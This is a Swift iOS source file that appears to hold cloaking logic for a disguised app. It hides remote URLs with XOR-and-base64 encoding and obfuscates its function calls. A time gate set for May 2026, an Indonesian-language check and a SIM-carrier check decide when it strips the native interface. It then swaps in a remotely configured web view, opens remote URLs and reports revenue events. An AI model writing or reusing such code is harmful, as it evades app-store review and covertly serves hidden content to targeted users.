
import Foundation
import UIKit
import AdjustSdk

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Tasicrt(_ input: String) -> String? {
    let k: UInt8 = 51
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    let viopj = String(bytes: decryptedBytes, encoding: .utf8)?.reversed()
    return String(viopj!)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
internal let kOxudbe = "XVxAWR1DWhwBRRxcWh1DWh5KXh1aQ1IcHAlAQ0dHWw=="         //Ip ur

//https://69fb275a88a7af0ecca88b0b.mockapi.io/cfiuens/zhongsuyh
internal let kUnisgbe = "W0pGQFRdXFtJHEBdVkZaVVAcXFodWkNSWFBcXh1RA1ELC1JQUFYDVVIEUgsLUgYEAVFVCgUcHAlAQ0dHWw=="

//https://mock.apipost.net/mock/6102d4a57088000/?apipost_id=102d5332b51002
//internal let kTxbuscoe = "IDw8ODtyZ2clJysjZik4ITgnOzxmJi08ZyUnKyNnfnl4eix8KX1/eHBweHh4Z3cpOCE4Jzs8FyEsdXl4eix9e3t6Kn15eHh6"

// https://raw.githubusercontent.com/jduja/spont/main/spon.jpg
//IDw8ODtyZ2c6KT9mLyE8ID0qPTstOisnJjwtJjxmKyclZyIsPSIpZyogJyRnJSkhJmcqJCkrIyAnJC1mOCYv
//internal let kEtazsud = "IDw8ODtyZ2c6KT9mLyE8ID0qPTstOisnJjwtJjxmKyclZyIsPSIpZyogJyRnJSkhJmcqJCkrIyAnJC1mOCYv"

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Kddoiehhn() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
//            let tp = ws.windows.first!.rootViewController! as! UINavigationController
            let tp = ws.windows.first!.rootViewController!
            for view in tp.view.subviews {
                if view.tag == 78 {
                    view.removeFromSuperview()
                }
            }
        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func Haisuox() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Kddoiehhn
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func Kxjasux(_ dt: Loamzese) {
    DispatchQueue.main.async {
        
        UserDefaults.standard.setModel(dt, forKey: "Loamzese")
        UserDefaults.standard.synchronize()
        
        let vc = FiutctDsioViewControler()
        vc.iuehs = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func Gsineys(_ param: Loamzese) {
    let fName = ""

    typealias rushBlitzIusj = (Loamzese) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : Kxjasux
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func PisniHsues(_ dic: [String : String], etDic: [String : String]) {
    var dataDic: [String : Any]?
    if let data = dic[DT] {
        dataDic = data.stringTo()
    }
    
    let name = dic[Nam]
    print(name!)
        
    //是否包含要发送的事件
    if etDic.keys.contains(name!) {
        let ade = ADJEvent(eventToken: etDic[name!]!)
//        if MatrixTyydgPPks.contains(name!) {
        if let amt = dataDic![amt] as? String, let cuy = dataDic![ren] {
            ade?.setRevenue(Double(amt)!, currency: cuy as! String)
        }
        if let amt = dataDic![amt] as? Int, let cuy = dataDic![ren] {
            ade?.setRevenue(Double(amt), currency: cuy as! String)
        }
        if let amt = dataDic![amt] as? Double, let cuy = dataDic![ren] {
            ade?.setRevenue(amt, currency: cuy as! String)
        }
//        }
        Adjust.trackEvent(ade)
    }
    
    if name == OpWin {
        if let str = dataDic![UL] {
            UIApplication.shared.open(URL(string: str as! String)!)
        }
    }
}



internal func CansjYusus(_ param: [String : String], _ param2: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String], [String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : PisniHsues
    ]
    
    fctn[fName]?(param, param2)
}


internal struct Jitsgc: Decodable {
    let vyusaw: String?
    let kvimso: String?

    let country: Gisyxon?
    
    struct Gisyxon: Decodable {
        let code: String
    }
}

internal struct Loamzese: Codable {
    let dsfq: [String]?
    let kfpoime: String?
    let vbmkso: String?

    let hcunse: [String : String]?           // a i d
    let kdoins: String?         //key arr
    let diaosu: String?         // shi fou kaiqi
    let aiwuc: [String]?            // yeu nan xianzhi
    let ndikco: String?         // jum
    let cnoauej: String?          // backcolor
    let mcouen: String?
    let dgsyes: String?  // bri co
    let ckoiem: String?   //ad key
    let fusbbet: Int?   // lang kongzhi
}

//internal func HaoeiuOOIS() {
//    if isTm() {
//        if UserDefaults.standard.object(forKey: "rota") != nil {
//            Fiuanoem()
//        } else {
//            UdnaioKoale()
//        }
//    } else {
//        Fiuanoem()
//    }
//}
//
//// MARK: - 加密调用全局函数HandySounetHmeSh
//internal func Bgsyeoj() {
//    let fName = ""
//    
//    let fctn: [String: () -> Void] = [
//        fName: HaoeiuOOIS
//    ]
//    
//    fctn[fName]?()
//}


func Kosubnte() -> Bool {
   
  // 2026-05-07 04:06:26
  //1778097989
  let ftTM = 1778097989
  let ct = Date().timeIntervalSince1970
  if ftTM - Int(ct) > 0 {
    return false
  }
  return true
}

func Bsounese() -> Bool {
    // 获取用户设置的首选语言（列表第一个）
    guard let cysh = Locale.preferredLanguages.first else {
        return false
    }
    // 印尼语代码：id 或 in（兼容旧版本）
    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
}

// 时区控制
func dikiuhs() -> Bool {
    
    // 1.sm cad
    if !ucuneyx() {
        return false
    }
    
    //2. regi
//    if let rc = Locale.current.regionCode {
////        print(rc)
//        if !cdo.contains(rc) {
//            return false
//        }
//    }
//    
//    //3. tm zon
//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
//    if (offset > 6 && offset < 9) {
//        return true
//    }
//    if (offset > 6 && offset <= 8) || (offset > -6 && offset < -1) {
//        return true
//    }
    
    return true
}

import CoreTelephony

func ucuneyx() -> Bool {
    let networkInfo = CTTelephonyNetworkInfo()
    
    guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
        return false
    }
    
    for (_, carrier) in carriers {
        if let mcc = carrier.mobileCountryCode,
           let mnc = carrier.mobileNetworkCode,
           !mcc.isEmpty,
           !mnc.isEmpty {
            return true
        }
    }
    
    return false
}



extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}

extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}
